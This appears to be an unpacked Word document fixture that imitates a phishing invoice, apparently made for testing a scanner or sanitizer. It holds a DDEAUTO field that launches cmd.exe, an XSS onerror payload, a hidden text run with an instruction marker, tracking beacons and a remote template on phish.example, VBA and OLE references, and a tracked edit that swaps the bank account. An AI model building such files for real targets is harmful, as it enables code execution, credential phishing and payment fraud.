
<file path=[Content_Types].xml><?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="html" ContentType="text/html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vbaProject.bin" ContentType="application/vnd.ms-office.vbaPro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overdue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Enable editing to see the invoice. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:vanish/>
        </w:rPr>
        <w:t>gorani hidden instruction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&lt;img src=x onerror=alert('docx')&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:t>Loading the invoice</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> INCLUDEPICTURE "http://phish.example/track.png" \d </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:t/>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p>
      <w:hyperlink r:id="rIdLink">
        <w:r>
          <w:t>Pay the invoice</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Account: </w:t>
      </w:r>
      <w:del w:id="91" w:author="phisher" w:date="2026-01-02T03:04:05Z">
        <w:r>
          <w:delText>DE89 3704 0044 0532 0130 00</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="92" w:author="phisher" w:date="2026-01-02T03:04:05Z">
        <w:r>
          <w:t>GB33 BUKB 2020 1555 5555 55</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:altChunk r:id="rIdAlt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attachedTemplate r:id="rIdTpl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" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://phish.example/login" TargetMode="External"/><Relationship Id="rIdAlt" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="afchunk.html"/><Relationship Id="rIdBeacon" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="\\phish.example\share\logo.png" TargetMode="External"/><Relationship Id="rIdOle" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/><Relationship Id="rIdVba" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>
</file>

<file path=word/_rels/settings.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdTpl" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://phish.example/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subject/>
  <dc:creator>Accounts</dc:creator>
  <cp:keywords/>
  <dc:description>generated by python-docx</dc:description>
  <cp:lastModifiedBy>phisher</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-01-02T03:04:05Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-02T03:04:05Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>